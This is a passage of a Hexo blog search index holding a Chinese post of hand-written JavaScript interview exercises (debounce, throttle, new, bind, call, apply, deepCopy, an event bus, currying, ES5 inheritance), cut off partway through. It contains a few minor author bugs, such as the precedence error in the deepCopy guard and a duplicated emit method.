<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>手写题目</title>
      <link href="/2022/08/07/hand/"/>
      <url>/2022/08/07/hand/</url>
      
        <content type="html"><![CDATA[<h4 id="1-防抖"><a href="#1-防抖" class="headerlink" title="1. 防抖"></a>1. 防抖</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">debounce</span>(<span class="params">func, ms = <span class="number">1000</span></span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> timer;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params">...args</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (timer) &#123;</span><br><span class="line">      <span class="built_in">clearTimeout</span>(timer);</span><br><span class="line">    &#125;</span><br><span class="line">    timer = <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      func.<span class="title function_">apply</span>(<span class="variable language_">this</span>, args);</span><br><span class="line">    &#125;, ms);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">task</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;run task&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> debounceTask = <span class="title function_">debounce</span>(task, <span class="number">1000</span>);</span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;scroll&quot;</span>, debounceTask);</span><br></pre></td></tr></table></figure><h4 id="2-节流"><a href="#2-节流" class="headerlink" title="2. 节流"></a>2. 节流</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">throttle</span>(<span class="params">func, ms = <span class="number">1000</span></span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> canRun = <span class="literal">true</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params">...args</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!canRun) <span class="keyword">return</span>;</span><br><span class="line">    canRun = <span class="literal">false</span>;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      func.<span class="title function_">apply</span>(<span class="variable language_">this</span>, args);</span><br><span class="line">      canRun = <span class="literal">true</span>;</span><br><span class="line">    &#125;, ms);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">task</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;run task&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> throttleTask = <span class="title function_">throttle</span>(task, <span class="number">1000</span>);</span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;scroll&quot;</span>, throttleTask);</span><br></pre></td></tr></table></figure><h4 id="3-new"><a href="#3-new" class="headerlink" title="3. new"></a>3. new</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">myNew</span>(<span class="params">Func, ...args</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> instance = &#123;&#125;;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title class_">Func</span>.<span class="property"><span class="keyword">prototype</span></span>) &#123;</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">setPrototypeOf</span>(instance, <span class="title class_">Func</span>.<span class="property"><span class="keyword">prototype</span></span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> res = <span class="title class_">Func</span>.<span class="title function_">apply</span>(instance, args);</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> res === <span class="string">&quot;function&quot;</span> || (<span class="keyword">typeof</span> res === <span class="string">&quot;object&quot;</span> &amp;&amp; res !== <span class="literal">null</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> instance;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params">name</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">sayName</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`My name is <span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span>`</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> me = <span class="title function_">myNew</span>(<span class="title class_">Person</span>, <span class="string">&quot;Jack&quot;</span>);</span><br><span class="line">me.<span class="title function_">sayName</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(me);</span><br></pre></td></tr></table></figure><h4 id="4-bind"><a href="#4-bind" class="headerlink" title="4. bind"></a>4. bind</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Function</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">myBind</span> = <span class="keyword">function</span> (<span class="params">context = globalThis</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> fn = <span class="variable language_">this</span>;</span><br><span class="line">  <span class="keyword">const</span> args = <span class="title class_">Array</span>.<span class="title function_">from</span>(<span class="variable language_">arguments</span>).<span class="title function_">slice</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">const</span> newFunc = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> newArgs = args.<span class="title function_">concat</span>(...<span class="variable language_">arguments</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span> <span class="keyword">instanceof</span> newFunc) &#123;</span><br><span class="line">      <span class="comment">// 通过 new 调用，绑定 this 为实例对象</span></span><br><span class="line">      fn.<span class="title function_">apply</span>(<span class="variable language_">this</span>, newArgs);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// 通过普通函数形式调用，绑定 context</span></span><br><span class="line">      fn.<span class="title function_">apply</span>(context, newArgs);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="comment">// 支持 new 调用方式</span></span><br><span class="line">  newFunc.<span class="property"><span class="keyword">prototype</span></span> = <span class="title class_">Object</span>.<span class="title function_">create</span>(fn.<span class="property"><span class="keyword">prototype</span></span>);</span><br><span class="line">  <span class="keyword">return</span> newFunc;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试</span></span><br><span class="line"><span class="keyword">const</span> me = &#123; <span class="attr">name</span>: <span class="string">&quot;Jack&quot;</span> &#125;;</span><br><span class="line"><span class="keyword">const</span> other = &#123; <span class="attr">name</span>: <span class="string">&quot;Jackson&quot;</span> &#125;;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">say</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`My name is <span class="subst">$&#123;<span class="variable language_">this</span>.name || <span class="string">&quot;default&quot;</span>&#125;</span>`</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> meSay = say.<span class="title function_">myBind</span>(me);</span><br><span class="line"><span class="title function_">meSay</span>();</span><br><span class="line"><span class="keyword">const</span> otherSay = say.<span class="title function_">myBind</span>(other);</span><br><span class="line"><span class="title function_">otherSay</span>();</span><br></pre></td></tr></table></figure><h4 id="5-call"><a href="#5-call" class="headerlink" title="5. call"></a>5. call</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Function</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">myCall</span> = <span class="keyword">function</span> (<span class="params">context = globalThis</span>) &#123;</span><br><span class="line">  <span class="comment">// 关键步骤，在 context 上调用方法，触发 this 绑定为 context，使用 Symbol 防止原有属性的覆盖</span></span><br><span class="line">  <span class="keyword">const</span> key = <span class="title class_">Symbol</span>(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">  context[key] = <span class="variable language_">this</span>;</span><br><span class="line">  <span class="comment">// es5 可通过 for 遍历 arguments 得到参数数组</span></span><br><span class="line">  <span class="keyword">const</span> args = [...<span class="variable language_">arguments</span>].<span class="title function_">slice</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">const</span> res = context[key](...args);</span><br><span class="line">  <span class="keyword">delete</span> context[key];</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试</span></span><br><span class="line"><span class="keyword">const</span> me = &#123; <span class="attr">name</span>: <span class="string">&quot;Jack&quot;</span> &#125;;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">say</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`My name is <span class="subst">$&#123;<span class="variable language_">this</span>.name || <span class="string">&quot;default&quot;</span>&#125;</span>`</span>);</span><br><span class="line">&#125;</span><br><span class="line">say.<span class="title function_">myCall</span>(me);</span><br></pre></td></tr></table></figure><h4 id="6-apply"><a href="#6-apply" class="headerlink" title="6. apply"></a>6. apply</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Function</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">myApply</span> = <span class="keyword">function</span> (<span class="params">context = globalThis</span>) &#123;</span><br><span class="line">  <span class="comment">// 关键步骤，在 context 上调用方法，触发 this 绑定为 context，使用 Symbol 防止原有属性的覆盖</span></span><br><span class="line">  <span class="keyword">const</span> key = <span class="title class_">Symbol</span>(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">  context[key] = <span class="variable language_">this</span>;</span><br><span class="line">  <span class="keyword">let</span> res;</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable language_">arguments</span>[<span class="number">1</span>]) &#123;</span><br><span class="line">    res = context[key](...<span class="variable language_">arguments</span>[<span class="number">1</span>]);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res = context[key]();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">delete</span> context[key];</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试</span></span><br><span class="line"><span class="keyword">const</span> me = &#123; <span class="attr">name</span>: <span class="string">&quot;Jack&quot;</span> &#125;;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">say</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`My name is <span class="subst">$&#123;<span class="variable language_">this</span>.name || <span class="string">&quot;default&quot;</span>&#125;</span>`</span>);</span><br><span class="line">&#125;</span><br><span class="line">say.<span class="title function_">myApply</span>(me);</span><br></pre></td></tr></table></figure><h4 id="7-deepCopy"><a href="#7-deepCopy" class="headerlink" title="7. deepCopy"></a>7. deepCopy</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">deepCopy</span>(<span class="params">obj, cache = <span class="keyword">new</span> <span class="built_in">WeakMap</span>()</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!obj <span class="keyword">instanceof</span> <span class="title class_">Object</span>) <span class="keyword">return</span> obj;</span><br><span class="line">  <span class="comment">// 防止循环引用</span></span><br><span class="line">  <span class="keyword">if</span> (cache.<span class="title function_">get</span>(obj)) <span class="keyword">return</span> cache.<span class="title function_">get</span>(obj);</span><br><span class="line">  <span class="comment">// 支持函数</span></span><br><span class="line">  <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> <span class="title class_">Function</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> obj.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 支持日期</span></span><br><span class="line">  <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> <span class="title class_">Date</span>) <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Date</span>(obj);</span><br><span class="line">  <span class="comment">// 支持正则对象</span></span><br><span class="line">  <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> <span class="title class_">RegExp</span>) <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">RegExp</span>(obj.<span class="property">source</span>, obj.<span class="property">flags</span>);</span><br><span class="line">  <span class="comment">// 还可以增加其他对象，比如：Map, Set等，根据情况判断增加即可，面试点到为止就可以了</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 数组是 key 为数字素银的特殊对象</span></span><br><span class="line">  <span class="keyword">const</span> res = <span class="title class_">Array</span>.<span class="title function_">isArray</span>(obj) ? [] : &#123;&#125;;</span><br><span class="line">  <span class="comment">// 缓存 copy 的对象，用于处理循环引用的情况</span></span><br><span class="line">  cache.<span class="title function_">set</span>(obj, res);</span><br><span class="line"></span><br><span class="line">  <span class="title class_">Object</span>.<span class="title function_">keys</span>(obj).<span class="title function_">forEach</span>(<span class="function">(<span class="params">key</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (obj[key] <span class="keyword">instanceof</span> <span class="title class_">Object</span>) &#123;</span><br><span class="line">      res[key] = <span class="title function_">deepCopy</span>(obj[key], cache);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      res[key] = obj[key];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试</span></span><br><span class="line"><span class="keyword">const</span> source = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;Jack&quot;</span>,</span><br><span class="line">  <span class="attr">meta</span>: &#123;</span><br><span class="line">    <span class="attr">age</span>: <span class="number">12</span>,</span><br><span class="line">    <span class="attr">birth</span>: <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="string">&quot;1997-10-10&quot;</span>),</span><br><span class="line">    <span class="attr">ary</span>: [<span class="number">1</span>, <span class="number">2</span>, &#123; <span class="attr">a</span>: <span class="number">1</span> &#125;],</span><br><span class="line">    <span class="title function_">say</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line">source.<span class="property">source</span> = source;</span><br><span class="line"><span class="keyword">const</span> newObj = <span class="title function_">deepCopy</span>(source);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(newObj.<span class="property">meta</span>.<span class="property">ary</span>[<span class="number">2</span>] === source.<span class="property">meta</span>.<span class="property">ary</span>[<span class="number">2</span>]); <span class="comment">// false</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(newObj.<span class="property">meta</span>.<span class="property">birth</span> === source.<span class="property">meta</span>.<span class="property">birth</span>); <span class="comment">// false</span></span><br></pre></td></tr></table></figure><h4 id="8-事件总线-发布订阅模式"><a href="#8-事件总线-发布订阅模式" class="headerlink" title="8. 事件总线 | 发布订阅模式"></a>8. 事件总线 | 发布订阅模式</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">EventEmitter</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">cache</span> = &#123;&#125;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">on</span>(<span class="params">name, fn</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">cache</span>[name]) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">cache</span>[name].<span class="title function_">push</span>(fn);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">cache</span>[name] = [fn];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">off</span>(<span class="params">name, fn</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> tasks = <span class="variable language_">this</span>.<span class="property">cache</span>[name];</span><br><span class="line">    <span class="keyword">if</span> (tasks) &#123;</span><br><span class="line">      <span class="keyword">const</span> index = tasks.<span class="title function_">findIndex</span>(<span class="function">(<span class="params">f</span>) =&gt;</span> f === fn || f.<span class="property">callback</span> === fn);</span><br><span class="line">      <span class="keyword">if</span> (index &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        tasks.<span class="title function_">splice</span>(index, <span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">emit</span>(<span class="params">name</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">cache</span>[name]) &#123;</span><br><span class="line">      <span class="comment">// 创建副本，如果回调函数内继续注册相同事件，会造成死循环</span></span><br><span class="line">      <span class="keyword">const</span> tasks = <span class="variable language_">this</span>.<span class="property">cache</span>[name].<span class="title function_">slice</span>();</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> fn <span class="keyword">of</span> tasks) &#123;</span><br><span class="line">        <span class="title function_">fn</span>();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">emit</span>(<span class="params">name, once = <span class="literal">false</span></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">cache</span>[name]) &#123;</span><br><span class="line">      <span class="comment">// 创建副本，如果回调函数内继续注册相同事件，会造成死循环</span></span><br><span class="line">      <span class="keyword">const</span> tasks = <span class="variable language_">this</span>.<span class="property">cache</span>[name].<span class="title function_">slice</span>();</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> fn <span class="keyword">of</span> tasks) &#123;</span><br><span class="line">        <span class="title function_">fn</span>();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (once) &#123;</span><br><span class="line">        <span class="keyword">delete</span> <span class="variable language_">this</span>.<span class="property">cache</span>[name];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试</span></span><br><span class="line"><span class="keyword">const</span> eventBus = <span class="keyword">new</span> <span class="title class_">EventEmitter</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">task1</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;task1&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">task2</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;task2&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line">eventBus.<span class="title function_">on</span>(<span class="string">&quot;task&quot;</span>, task1);</span><br><span class="line">eventBus.<span class="title function_">on</span>(<span class="string">&quot;task&quot;</span>, task2);</span><br><span class="line"></span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  eventBus.<span class="title function_">emit</span>(<span class="string">&quot;task&quot;</span>);</span><br><span class="line">&#125;, <span class="number">1000</span>);</span><br></pre></td></tr></table></figure><h4 id="9-柯里化：只传递给函数一部分参数来调用它，让它返回一个函数去处理剩下的参数"><a href="#9-柯里化：只传递给函数一部分参数来调用它，让它返回一个函数去处理剩下的参数" class="headerlink" title="9. 柯里化：只传递给函数一部分参数来调用它，让它返回一个函数去处理剩下的参数"></a>9. 柯里化：只传递给函数一部分参数来调用它，让它返回一个函数去处理剩下的参数</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">curry</span>(<span class="params">func</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">function</span> <span class="title function_">curried</span>(<span class="params">...args</span>) &#123;</span><br><span class="line">    <span class="comment">// 关键知识点：function.length 用来获取函数的形参个数</span></span><br><span class="line">    <span class="comment">// 补充：arguments.length 获取的是实参个数</span></span><br><span class="line">    <span class="keyword">if</span> (args.<span class="property">length</span> &gt;= func.<span class="property">length</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> func.<span class="title function_">apply</span>(<span class="variable language_">this</span>, args);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params">...args2</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> curried.<span class="title function_">apply</span>(<span class="variable language_">this</span>, args.<span class="title function_">concat</span>(args2));</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sum</span>(<span class="params">a, b, c</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> a + b + c;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> curriedSum = <span class="title function_">curry</span>(sum);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">curriedSum</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">curriedSum</span>(<span class="number">1</span>)(<span class="number">2</span>, <span class="number">3</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">curriedSum</span>(<span class="number">1</span>)(<span class="number">2</span>)(<span class="number">3</span>));</span><br></pre></td></tr></table></figure><h4 id="10-es5-实现继承"><a href="#10-es5-实现继承" class="headerlink" title="10. es5 实现继承"></a>10. es5 实现继承</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">create</span>(<span class="params">proto</span>) &#123;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">F</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line">  F.<span class="property"><span class="keyword">prototype</span></span> = proto;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title 